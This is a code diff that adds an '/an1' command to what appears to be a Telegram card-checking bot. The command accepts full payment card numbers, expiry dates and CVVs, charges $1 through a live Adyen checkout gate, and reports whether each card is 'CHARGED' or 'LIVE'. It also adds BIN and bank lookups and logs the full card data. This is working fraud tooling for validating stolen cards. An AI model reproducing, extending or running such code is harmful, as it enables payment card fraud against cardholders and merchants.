@@ -6851,6 +6851,117 @@ async def _make_the_machine_ready():
 
 
 
+
+# --- /an1 — Adyen $1 Charge ---
+@client.on(events.NewMessage(pattern=r"(?i)^[/]an1\b"))
+async def an1_cmd(event):
+    """Single card Adyen $1 charge."""
+    can_access, access_type = await can_use(event.sender_id, event.chat)
+    if access_type == "banned":
+        return await event.reply(banned_user_message())
+    if not can_access:
+        msg, buttons = access_denied_message_with_button()
+        return await event.reply(msg, buttons=buttons)
+    await register_user(event.sender_id)
+    user_id = event.sender_id
+
+    allowed, remaining = check_cooldown(user_id)
+    if not allowed:
+        return await event.reply(f"Cooldown: wait {remaining}s")
+
+    words = (event.message.text or "").split()
+    # Strip duplicate /an1
+    while len(words) > 1 and words[1].lower().startswith("/an1"):
+        words.pop(1)
+
+    if len(words) < 2:
+        return await event.reply(
+            "**Adyen $1 Charge**\n\n"
+            "Usage:\n"
+            "`/an1 cc|mm|yy|cvv` — uses saved Adyen URL\n"
+            "`/an1 cc|mm|yy|cvv https://checkoutshopper-live.adyen.com/...` — custom URL")
+
+    card = words[1].strip().strip("`").strip("'").strip('"')
+    card = card.replace("`", "").replace("'", "").replace('"', "")
+    parts = [p.strip() for p in card.split("|")]
+    if len(parts) != 4:
+        return await event.reply("The card must be `cc|mm|yy|cvv`.")
+    cc, mm, yy, cvv = parts
+    cc = "".join(c for c in cc if c.isdigit())
+    mm = "".join(c for c in mm if c.isdigit())
+    yy = "".join(c for c in yy if c.isdigit())
+    cvv = "".join(c for c in cvv if c.isdigit())
+    if not (cc and mm and yy and cvv):
+        return await event.reply("The card must be `cc|mm|yy|cvv`.")
+    if len(yy) == 4:
+        yy = yy[2:]
+    mm = mm.zfill(2)
+
+    # Check for Adyen URL in command
+    payment_url = None
+    if len(words) > 2:
+        url_candidate = " ".join(words[2:]).strip().strip("`").strip("'")
+        if any(mark in url_candidate.lower() for mark in
+               ("adyen.com", "adyen.link", "checkoutshopper", "adyenpayments")):
+            payment_url = url_candidate
+            # Save URL for next time
+            try:
+                from gates.adyen_co import save_payment_url
+                save_payment_url(payment_url)
+            except: pass
+
+    status_msg = await event.reply("**Adyen $1 Charge**\n\nCharging $1.00...")
+
+    try:
+        from gates.adyen_co import adyen_co_check
+        status, message, card_info, elapsed, cached = await asyncio.wait_for(
+            adyen_co_check(cc, mm, yy, cvv,
+                          payment_url=payment_url,
+                          amount=1.00,
+                          currency="USD"),
+            timeout=90)
+    except asyncio.TimeoutError:
+        return await status_msg.edit("**Adyen $1 Charge**\n\nTimeout (90s)")
+    except Exception as e:
+        return await status_msg.edit("**Adyen $1 Charge**\n\nError: %s" % str(e)[:120])
+
+    # Format result
+    if status == "charged":
+        icon = "\U0001F525"
+        status_label = "CHARGED"
+    elif status == "live":
+        icon = "\u2705"
+        status_label = "LIVE"
+    elif status == "declined":
+        icon = "\u274C"
+        status_label = "DECLINED"
+    else:
+        icon = "\u26A0\uFE0F"
+        status_label = "ERROR"
+
+    try:
+        brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
+    except:
+        brand = bin_type = level = bank = country = flag = "-"
+
+    text = ("%s **Adyen $1 Charge**\n`%s|%s|%s|%s`\n**%s** — %s\n"
+            % (icon, cc, mm, yy, cvv, status_label, str(message)[:160]))
+    text += "Amount: $1.00\n"
+    text += "Bin: %s - %s\nBank: %s\nCountry: %s\n" % (cc[:6], bin_type, bank, country)
+    text += "Time: %.1fs" % (elapsed if isinstance(elapsed, (int, float)) else 0)
+
+    await status_msg.edit(text)
+
+    # Log
+    try:
+        await log_gate_result("AN1", "%s|%s|%s|%s" % (cc, mm, yy, cvv),
+                              status.upper(), str(message)[:100],
+                              elapsed if isinstance(elapsed, (int, float)) else 0,
+                              user_id, "", "single")
+    except: pass
+
+
+
 # --- /msh — Mass Shopify Native Check ---
 ACTIVE_MSH_PROCESSES = {}
 
